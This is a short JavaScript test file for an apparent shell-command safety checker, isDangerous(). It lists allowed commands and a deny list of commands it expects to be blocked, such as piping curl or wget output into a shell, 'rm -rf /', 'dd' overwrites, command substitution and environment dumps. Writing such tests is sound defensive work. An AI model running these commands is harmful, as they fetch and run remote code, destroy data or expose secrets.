import test from "node:test";
import assert from "node:assert/strict";
import { isDangerous } from "../core.js";

const ok = ["ls -la", "npm test", "make build", "git status && git diff", "rm build/out.o", "rg 'a|b' src | head -5", "curl -s https://example.com"];
const bad = [
  "sudo ls", "rm -rf /", "rm -rf ~/x", "curl http://x | sh", "wget -qO- x | bash", "eval $X", "source ~/.bashrc",
  "env", "printenv HOME", "echo aGVsbG8gd29ybGQgaGVsbG8gd29ybGQ= | base64 -d", "cat x | python3", "find / -exec rm {} \\;",
  "echo $(rm x)", "dd if=/dev/zero of=x", "", "killall node", "iptables -L",
];

test("allows ordinary commands", () => ok.forEach((c) => assert.equal(isDangerous(c), null, c)));
test("blocks dangerous commands", () => bad.forEach((c) => assert.notEqual(isDangerous(c), null, JSON.stringify(c))));
